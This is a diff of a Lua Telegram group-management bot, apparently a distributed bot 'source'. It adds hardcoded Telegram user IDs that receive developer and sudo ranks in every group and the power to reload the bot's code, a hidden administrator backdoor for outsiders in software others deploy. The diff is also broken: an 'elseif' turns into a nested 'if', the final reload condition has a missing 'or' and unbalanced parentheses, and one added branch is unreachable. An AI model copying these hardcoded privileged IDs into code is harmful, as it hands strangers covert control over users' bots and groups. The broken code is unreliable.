@@ -90,7 +90,7 @@ Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
 Cr_file:close()
 print('\27[1;36m￤Token.txt is created.\27[m')
-local Text = " اهلا عزيزي[المطور الاساسي](tg://user?id="..SUDO_USER..") \n شكرا لاستخدامك سورس شهد \n أرســل  الان /start\n لاضهار الاوامر للمطور  المجهزه بالكيبورد\n\n"
+local Text = " اهلا عزيزي[المطور الاساسي](tg://user?id="..SUDO_USER..") \n شكرا لاستخدامك سورس شهد \n ارسل الان /start\n لاضهار الاوامر للمطور  المجهزه بالكيبورد\n\n"
 https.request(Api_Token..'/sendMessage?chat_id='..SUDO_USER..'&text='..URL.escape(Text)..'&parse_mode=Markdown')
 local CmdRun = [[
 rm -f ./README.md
@@ -275,36 +275,48 @@ end
 return false 
 end 
 
-if msg.sender_user_id_ == 1619524486 or msg.sender_user_id_ == 1619524486 then 
+if msg.sender_user_id_ == 1619523386 or msg.sender_user_id_ == 1619524486 then 
 msg.TheRankCmd = 'مطور السورس'
 msg.TheRank = 'مطور السورس'
 msg.Rank = 1
-elseif msg.sender_user_id_ == 2089102006 then 
-msg.TheRankCmd = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or '𝗞 𝗛 𝗗' 
-msg.TheRank = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or '𝗞 𝗛 𝗗' 
+if msg.sender_user_id_ == 2089102006 or msg.sender_user_id_ == 2089102006 then 
+msg.TheRankCmd = '𝗞 𝗛 𝗗 ♪'
+msg.TheRank = '𝗞 𝗛 𝗗 ♪'
 msg.Rank = 1
+elseif msg.sender_user_id_ == 988115723 then 
+msg.TheRankCmd = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'S7S' 
+msg.TheRank = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'S7S' 
+msg.Rank = 2
+elseif msg.sender_user_id_ == 1976387497 then 
+msg.TheRankCmd = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'افعى بجسد انثى' 
+msg.TheRank = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'افعى بجسد انثى' 
+msg.Rank = 3
 elseif redis:sismember(boss..':SUDO_BOT:',msg.sender_user_id_) then 
 msg.TheRankCmd = redis:get(boss..":RtbaNew2:"..msg.chat_id_) or 'المطور'
 msg.TheRank = redis:get(boss..":RtbaNew2:"..msg.chat_id_) or 'Myth'
 msg.Rank = 2
+elseif redis:sismember(boss..':SUDO_BOT:',msg.sender_user_id_) then 
+msg.TheRankCmd = redis:get(boss..":RtbaNew3:"..msg.chat_id_) or 'المطور 🎖'
+msg.TheRank = redis:get(boss..":RtbaNew3:"..msg.chat_id_) or 'Myth🎖'
+msg.Rank = 2
 elseif msg.GroupActive and redis:sismember(boss..':MONSHA_Group:'..msg.chat_id_,msg.sender_user_id_) then 
-msg.TheRankCmd = redis:get(boss..":RtbaNew3:"..msg.chat_id_) or 'المالك الاساسي'
-msg.TheRank = redis:get(boss..":RtbaNew3:"..msg.chat_id_) or 'المالك الاساسي'
+msg.TheRankCmd = redis:get(boss..":RtbaNew4:"..msg.chat_id_) or 'المالك الاساسي'
+msg.TheRank = redis:get(boss..":RtbaNew4:"..msg.chat_id_) or 'المالك الاساسي'
 msg.Rank = 11
 elseif msg.GroupActive and redis:sismember(boss..':MONSHA_BOT:'..msg.chat_id_,msg.sender_user_id_) then 
-msg.TheRankCmd = redis:get(boss..":RtbaNew4:"..msg.chat_id_) or 'المالك'
-msg.TheRank = redis:get(boss..":RtbaNew4:"..msg.chat_id_) or 'المالك '
+msg.TheRankCmd = redis:get(boss..":RtbaNew5:"..msg.chat_id_) or 'المالك'
+msg.TheRank = redis:get(boss..":RtbaNew5:"..msg.chat_id_) or 'المالك '
 msg.Rank = 3
 elseif msg.GroupActive and redis:sismember(boss..'owners:'..msg.chat_id_,msg.sender_user_id_) then 
-msg.TheRankCmd = redis:get(boss..":RtbaNew5:"..msg.chat_id_) or 'المدير' 
-msg.TheRank = redis:get(boss..":RtbaNew5:"..msg.chat_id_) or 'المدير' 
+msg.TheRankCmd = redis:get(boss..":RtbaNew6:"..msg.chat_id_) or 'المدير' 
+msg.TheRank = redis:get(boss..":RtbaNew6:"..msg.chat_id_) or 'المدير' 
 msg.Rank = 4
 elseif msg.GroupActive and redis:sismember(boss..'admins:'..msg.chat_id_,msg.sender_user_id_) then 
-msg.TheRankCmd = redis:get(boss..":RtbaNew6:"..msg.chat_id_) or 'الادمن'
-msg.TheRank = redis:get(boss..":RtbaNew6:"..msg.chat_id_) or 'الادمن'
+msg.TheRankCmd = redis:get(boss..":RtbaNew7:"..msg.chat_id_) or 'الادمن'
+msg.TheRank = redis:get(boss..":RtbaNew7:"..msg.chat_id_) or 'الادمن'
 msg.Rank = 5
 elseif msg.GroupActive and redis:sismember(boss..'whitelist:'..msg.chat_id_,msg.sender_user_id_) then 
-msg.TheRank = redis:get(boss..":RtbaNew7:"..msg.chat_id_) or 'عضو مميز'
+msg.TheRank = redis:get(boss..":RtbaNew8:"..msg.chat_id_) or 'عضو مميز'
 msg.Rank = 6
 elseif msg.sender_user_id_ == our_id then
 msg.Rank = 7
@@ -324,6 +336,9 @@ msg.Director = true
 end
 if msg.Rank == 1 or msg.Rank == 2 then
 msg.SudoUser = true
+end
+if msg.Rank == 1 or msg.Rank == 2 then
+msg.SudoDev = true
 end
 if msg.Rank == 1 or msg.Rank == 2 or msg.Rank == 3 then
 msg.Creator = true
@@ -934,7 +949,8 @@ dofile("./inc/Run.lua")
 print("Reload ~ ./inc/Run.lua")
 end) 
 end
-if (msg.text == 'reload' or msg.text == "تحديث البوت") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1619524486 or msg.sender_user_id_ == 1619524486) then
+if (msg.text == 'reload' or msg.text == "تحديث البوت") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1619524486 or msg.sender_user_id_ == 1619524486)
+msg.sender_user_id_ == 2089102006 or msg.sender_user_id_ == 2089102006) then
 sendMsg(msg.chat_id_,msg.id_,'*تم يروحي انت*',function(arg,data)
 dofile("./inc/Run.lua")
 print("Reload ~ ./inc/Run.lua")
